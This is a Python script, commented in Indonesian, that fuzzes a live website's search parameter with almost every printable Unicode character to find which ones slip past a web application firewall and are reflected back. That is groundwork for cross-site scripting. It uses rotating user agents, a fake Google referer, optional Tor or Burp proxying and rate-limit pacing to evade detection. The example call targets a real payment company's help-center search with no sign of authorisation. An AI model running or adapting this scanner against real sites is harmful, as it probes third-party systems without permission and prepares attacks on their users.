import requests
import random
import urllib.parse
import time

# Generate semua simbol Unicode yang valid untuk URL encoding
def generate_all_symbols():
    return [chr(i) for i in range(0x0020, 0x10FFFF) if chr(i).isprintable()]

# Random User-Agent List
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/537.36"
]

# Fungsi untuk menguji simbol dengan delay lebih lama
def test_xss_bypass(url, use_proxy=False, use_random_agent=False):
    symbols = generate_all_symbols()
    valid_symbols = []

    # Gunakan sesi agar koneksi tetap sama
    session = requests.Session()

    # Proxy Config (Ganti dengan TOR jika perlu)
    if use_proxy:
        proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}  # Burp Suite
        # proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}  # TOR Proxy
    else:
        proxies = {}  # Tanpa proxy

    for symbol in symbols:
        payload = urllib.parse.quote(symbol)  # Encode simbol untuk URL
        test_url = url.format(simbolrandom=payload)
        
        headers = {
            "User-Agent": random.choice(USER_AGENTS) if use_random_agent else USER_AGENTS[0],
            "Referer": "https://www.google.com/",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive"
        }

        try:
            response = session.get(test_url, headers=headers, proxies=proxies, timeout=15)
            status_code = response.status_code
            response_text_snippet = response.text[:200]  # Ambil 200 karakter pertama dari response body
            
            if status_code == 200 and symbol in response.text:
                print(f"[✅] Simbol lolos WAF: {symbol} | {test_url} | Status: {status_code}")
                print(f"    Response Snippet: {response_text_snippet}\n")
                valid_symbols.append(symbol)
            else:
                print(f"[❌] Simbol diblokir: {symbol} | Status: {status_code}")

        except requests.exceptions.ReadTimeout:
            print(f"[⚠️] Timeout saat mengakses {test_url}, mencoba lagi dengan delay lebih lama...")
            time.sleep(5)  # Jika timeout, coba lagi dengan delay lebih lama
        except requests.exceptions.ProxyError:
            print("[⚠️] Proxy tidak dapat dihubungi, coba jalankan tanpa proxy.")
            break
        except requests.exceptions.RequestException as e:
            print(f"[⚠️] Error saat mengakses {test_url}: {e}")

        # Tunggu lebih lama (2 detik) untuk menghindari rate-limiting
        time.sleep(2)

    print("\n🔥 Simbol yang berhasil lolos WAF:", "".join(valid_symbols))

# 🔥 Contoh penggunaan
test_xss_bypass("https://www.dana.id/help-center/search?search={simbolrandom}", use_proxy=False, use_random_agent=True)
